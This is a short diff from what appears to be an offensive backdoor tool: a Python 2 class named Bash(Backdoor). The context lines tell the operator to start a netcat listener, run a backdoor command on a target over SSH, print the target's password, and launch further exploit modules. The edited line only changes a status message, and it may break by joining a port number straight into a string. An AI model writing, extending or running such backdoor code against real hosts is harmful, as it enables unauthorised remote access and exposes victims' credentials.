@@ -23,7 +23,7 @@ class Bash(Backdoor):
         print(GOOD + "Initializing backdoor...")
         raw_input(INFO + "Please create a listener with the command nc -v -n -l -p " + str(port))
         target.ssh.exec_command(self.get_command())
-        print(GOOD + "Bash Backdoor on port %s attempted. You may need to input the password, which is " + target.pword)
+        print(GOOD + "Bash Backdoor on port " + port + " attempted. You may need to input the password, which is " + target.pword)
         for mod in self.modules.keys():
             print(INFO + "Attempting to execute " + mod.name + " module...")
             mod.exploit()
